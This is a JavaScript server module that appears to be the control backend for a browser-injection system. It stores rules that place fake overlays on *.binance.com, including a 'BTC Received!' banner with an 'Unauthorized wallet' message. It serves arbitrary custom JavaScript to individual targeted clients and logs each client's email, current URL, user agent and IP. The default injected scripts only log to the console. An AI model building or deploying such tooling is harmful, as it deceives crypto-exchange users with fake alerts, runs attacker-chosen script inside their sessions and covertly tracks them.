import fs from 'fs';
import path from 'path';

const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'store.json');

const INITIAL_DATA = {
  rules: [
    {
      id: 'rule-binance-default',
      name: 'Binance BTC Received Alert',
      domain: '*.binance.com',
      enabled: true,
      priority: 10,
      targetClientId: null,
      overlay: {
        height: '50',
        bg: '#0b0e11',
        text: '#eaecef',
        titleColor: '#f0b90b',
        title: 'BTC Received!',
        message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
        position: 'top',
        closable: true,
        customCss: `#custom-sticky-popup {
  animation: slideDown 0.35s ease-out;
  border-bottom: 2px solid #f0b90b !important;
}
@keyframes slideDown {
  from { transform: translateY(-100%); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}`,
        customJs: `// Custom dynamic script injected for Binance
console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostname);`
      },
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    {
      id: 'rule-global-fallback',
      name: 'Global Notice (All Domains)',
      domain: '*',
      enabled: false,
      priority: 1,
      targetClientId: null,
      overlay: {
        height: '25',
        bg: '#181a20',
        text: '#ffffff',
        titleColor: '#00c087',
        title: 'Universal Remote Alert',
        message: 'This alert was configured globally from the Next.js Admin Dashboard.',
        position: 'top',
        closable: true,
        customCss: '',
        customJs: `console.log('[RemoteOverlay] Global overlay injected on:', window.location.hostname);`
      },
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    }
  ],
  clients: [],
  messages: [],
  stats: {
    totalRequests: 0,
    lastSync: new Date().toISOString(),
  }
};

function ensureDb() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(INITIAL_DATA, null, 2), 'utf-8');
  }
}

export function getDb() {
  ensureDb();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(raw);
  } catch (err) {
    console.error('Error reading store.json, resetting to defaults:', err);
    return INITIAL_DATA;
  }
}

export function saveDb(data) {
  ensureDb();
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
}

export function matchDomain(pattern, targetDomain) {
  if (!pattern || !targetDomain) return false;
  pattern = pattern.trim().toLowerCase();
  targetDomain = targetDomain.trim().toLowerCase();

  if (pattern === '*' || pattern === '<all_urls>') return true;
  if (pattern === targetDomain) return true;

  // Wildcard subdomain e.g. *.binance.com
  if (pattern.startsWith('*.')) {
    const root = pattern.slice(2);
    return targetDomain === root || targetDomain.endsWith('.' + root);
  }

  // Exact suffix or prefix
  if (pattern.includes('*')) {
    const regexStr = '^' + pattern.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$';
    return new RegExp(regexStr).test(targetDomain);
  }

  return targetDomain.includes(pattern);
}

export function findMatchingRule(domain, clientId = null) {
  const db = getDb();
  db.stats.totalRequests = (db.stats.totalRequests || 0) + 1;
  db.stats.lastSync = new Date().toISOString();
  saveDb(db);

  if (!domain) return null;

  // 1. Check for targeted active message for this specific client
  if (clientId) {
    const targetedMsg = (db.messages || []).find(
      (m) => m.isActive && m.targetClientId === clientId
    );
    if (targetedMsg) {
      return {
        id: targetedMsg.id,
        name: `Targeted Message for ${clientId}`,
        domain: domain,
        enabled: true,
        priority: 999,
        targetClientId: clientId,
        overlay: {
          height: targetedMsg.height || '40',
          bg: targetedMsg.colorBg || '#1e2329',
          text: targetedMsg.colorText || '#eaecef',
          titleColor: targetedMsg.colorTitle || '#f0b90b',
          title: targetedMsg.title,
          message: targetedMsg.body,
          position: 'top',
          closable: true,
          customCss: targetedMsg.customCss || '',
          customJs: targetedMsg.customJs || '',
        },
        isTargetedMessage: true,
        updatedAt: targetedMsg.createdAt,
      };
    }
  }

  // 2. Check enabled rules matching the domain, sorted by priority
  const activeRules = (db.rules || []).filter((r) => r.enabled);

  // Match targeted rules for this client first
  if (clientId) {
    const clientSpecificRule = activeRules.find(
      (r) => r.targetClientId === clientId && matchDomain(r.domain, domain)
    );
    if (clientSpecificRule) return clientSpecificRule;
  }

  // Next match domain specific rules (excluding wildcard * first)
  const domainSpecificRules = activeRules
    .filter((r) => r.domain !== '*' && matchDomain(r.domain, domain))
    .sort((a, b) => (b.priority || 0) - (a.priority || 0));

  if (domainSpecificRules.length > 0) {
    return domainSpecificRules[0];
  }

  // Next match global wildcard * if available
  const globalRule = activeRules.find((r) => r.domain === '*');
  if (globalRule) {
    return globalRule;
  }

  return null;
}

export function registerClientHeartbeat({ clientId, email, domain, currentUrl, userAgent, ip }) {
  const db = getDb();
  db.clients = db.clients || [];

  const existingIndex = db.clients.findIndex((c) => c.clientId === clientId);
  const now = new Date().toISOString();

  const clientInfo = {
    clientId,
    email: email || (existingIndex >= 0 ? db.clients[existingIndex].email : 'Anonymous Client'),
    lastDomain: domain || 'unknown',
    lastUrl: currentUrl || '',
    lastSeen: now,
    userAgent: userAgent || '',
    ip: ip || '127.0.0.1',
    status: 'online',
  };

  if (existingIndex >= 0) {
    db.clients[existingIndex] = {
      ...db.clients[existingIndex],
      ...clientInfo,
    };
  } else {
    db.clients.unshift(clientInfo);
  }

  // Prune clients older than 30 days if too many
  if (db.clients.length > 200) {
    db.clients = db.clients.slice(0, 200);
  }

  saveDb(db);
  return clientInfo;
}
